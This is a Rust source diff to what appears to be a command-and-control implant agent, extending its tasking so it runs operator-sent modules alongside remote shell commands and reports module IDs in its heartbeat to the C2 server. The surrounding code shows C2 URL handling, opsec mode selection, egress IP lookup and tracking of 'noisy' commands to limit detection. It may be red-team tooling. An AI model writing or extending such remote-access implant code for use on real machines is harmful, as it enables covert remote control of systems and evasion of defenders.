@@ -1,5 +1,6 @@
 use crate::auth::{AgentAuth, CredentialSource, CredentialUse, SecretCredential};
 use crate::config::{validate_c2_base_url, AgentConfig};
+use crate::modules;
 use crate::networking::egress::get_egress_ip;
 use crate::opsec::{determine_agent_mode, AgentMode};
 use crate::tasks::{
@@ -152,6 +153,7 @@ fn normalized_local_ips(candidates: Vec<String>) -> Vec<String> {
 struct ShellExecution {
     stdout: String,
     stderr: String,
+    data: Option<Value>,
     exit_code: Option<i32>,
     error: Option<String>,
 }
@@ -161,6 +163,7 @@ impl ShellExecution {
         Self {
             stdout: String::new(),
             stderr: String::new(),
+            data: None,
             exit_code: None,
             error: Some(error.into()),
         }
@@ -189,6 +192,7 @@ async fn execute_shell(command: &str, timeout_seconds: u64) -> ShellExecution {
                 stdout,
                 stderr: String::new(),
                 exit_code: Some(0),
+                data: None,
                 error: None,
             },
             Err(err) => ShellExecution::failed(err.to_string()),
@@ -380,6 +384,7 @@ impl CapturedOutput {
             stdout,
             stderr,
             exit_code,
+            data: None,
             error: (!errors.is_empty()).then(|| errors.join("; ")),
         }
     }
@@ -1024,7 +1029,8 @@ fn build_heartbeat_payload(
         "ip": ip,
         "ip_list": ip_list,
         "egress_ip": egress_ip,
-        "commands": Vec::<String>::new()
+        "commands": Vec::<String>::new(),
+        "module_ids": modules::registered_module_ids()
     })
 }
 
@@ -1263,6 +1269,7 @@ fn build_task_result(
         output: TaskOutput {
             stdout: execution.stdout,
             stderr: execution.stderr,
+            data: execution.data,
         },
         error: bound_result_error(execution.error),
     }
@@ -1319,16 +1326,43 @@ impl TaskTransport for HttpTaskTransport<'_> {
     }
 }
 
+async fn execute_module(task: &Task) -> ShellExecution {
+    let Some(module_id) = task.arguments.module_id.as_deref() else {
+        return ShellExecution::failed("module task is missing module_id");
+    };
+    let Some(input) = task.arguments.input.as_ref() else {
+        return ShellExecution::failed("module task is missing input");
+    };
+
+    match tokio::time::timeout(
+        Duration::from_secs(task.timeout_seconds),
+        modules::execute(module_id, input),
+    )
+    .await
+    {
+        Ok(Ok(data)) => ShellExecution {
+            stdout: String::new(),
+            stderr: String::new(),
+            data: Some(data),
+            exit_code: Some(0),
+            error: None,
+        },
+        Ok(Err(error)) => ShellExecution::failed(format!("module execution failed: {error}")),
+        Err(_) => ShellExecution::failed("module execution timed out"),
+    }
+}
+
 trait TaskExecutor {
     async fn execute(&self, task: &Task) -> ShellExecution;
 }
 
-struct ShellTaskExecutor;
+struct AgentTaskExecutor;
 
-impl TaskExecutor for ShellTaskExecutor {
+impl TaskExecutor for AgentTaskExecutor {
     async fn execute(&self, task: &Task) -> ShellExecution {
         match &task.task_type {
             TaskType::Shell => execute_shell(&task.arguments.command, task.timeout_seconds).await,
+            TaskType::Module => execute_module(task).await,
         }
     }
 }
@@ -1464,7 +1498,9 @@ impl TaskOutbox {
                             if !self.claim_execution(task_id) {
                                 return;
                             }
-                            if is_strong_command(&task.arguments.command) {
+                            if matches!(&task.task_type, TaskType::Shell)
+                                && is_strong_command(&task.arguments.command)
+                            {
                                 mark_noisy_command_executed();
                             }
                             let execution = executor.execute(&task).await;
@@ -1637,7 +1673,7 @@ async fn process_task_outbox(
         auth,
     };
     TASK_OUTBOX
-        .process_all(&transport, &ShellTaskExecutor)
+        .process_all(&transport, &AgentTaskExecutor)
         .await;
 }
 
@@ -1906,6 +1942,7 @@ mod tests {
                 stdout: "hello\n".to_string(),
                 stderr: String::new(),
                 exit_code: Some(0),
+                data: None,
                 error: None,
             },
         );
@@ -1925,12 +1962,36 @@ mod tests {
                 stdout: String::new(),
                 stderr: "permission denied\n".to_string(),
                 exit_code: Some(1),
+                data: None,
                 error: Some("command exited with status 1".to_string()),
             },
         );
         assert_eq!(failed.outcome, TaskOutcome::Failed);
         assert_eq!(failed.output.stderr, "permission denied\n");
         assert_eq!(failed.exit_code, Some(1));
+    }
+
+    #[tokio::test]
+    async fn module_task_executor_returns_structured_capability_evidence() {
+        let mut task = sample_task("unused");
+        task.task_type = TaskType::Module;
+        task.arguments = crate::tasks::TaskArguments {
+            command: String::new(),
+            module_id: Some(crate::modules::CAPABILITY_INVENTORY_ID.to_string()),
+            input: Some(serde_json::json!({})),
+        };
+        task.validate_for_agent("agent-one")
+            .expect("valid module task");
+
+        let execution = AgentTaskExecutor.execute(&task).await;
+        assert_eq!(execution.exit_code, Some(0));
+        assert!(execution.stdout.is_empty());
+        assert!(execution.stderr.is_empty());
+        let data = execution.data.expect("module result data");
+        assert_eq!(data.as_object().expect("object").len(), 4);
+        assert!(data["logical_cpu_count"]
+            .as_u64()
+            .is_some_and(|count| count > 0));
     }
 
     #[cfg(unix)]
@@ -2606,6 +2667,10 @@ mod tests {
         assert_eq!(payload["listener_id"], "listener-one");
         assert_eq!(payload["ip"], "192.0.2.10");
         assert_eq!(payload["ip_list"], json!(["192.0.2.10"]));
+        assert_eq!(
+            payload["module_ids"],
+            json!([crate::modules::CAPABILITY_INVENTORY_ID])
+        );
         assert_ne!(payload["id"], payload["payload_id"]);
     }
 
@@ -2687,6 +2752,7 @@ mod tests {
             task_type: crate::tasks::TaskType::Shell,
             arguments: crate::tasks::TaskArguments {
                 command: command.to_string(),
+                ..crate::tasks::TaskArguments::default()
             },
             timeout_seconds: 30,
             status: crate::tasks::TaskStatus::Dispatched,
@@ -2839,6 +2905,7 @@ mod tests {
                     stdout: stdout.to_string(),
                     stderr: String::new(),
                     exit_code: Some(0),
+                    data: None,
                     error: None,
                 },
             }
